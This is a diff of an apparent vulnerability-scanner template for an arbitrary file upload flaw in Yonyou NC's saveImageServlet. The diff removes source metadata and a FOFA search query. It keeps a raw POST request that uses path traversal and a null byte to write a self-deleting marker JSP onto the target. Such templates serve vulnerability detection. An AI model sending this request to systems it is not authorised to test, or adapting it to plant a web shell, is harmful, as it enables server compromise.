@@ -3,20 +3,14 @@ info:
   name: 用友NC saveImageServlet 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gxpuq7chzir9hep7'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gxpuq7chzir9hep7
-    fofa: app="用友-UFIDA-NC" || title="YONYOU NC"
 http:
 - raw:
   - 'POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../dudesuite.jsp%00 HTTP/1.1
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
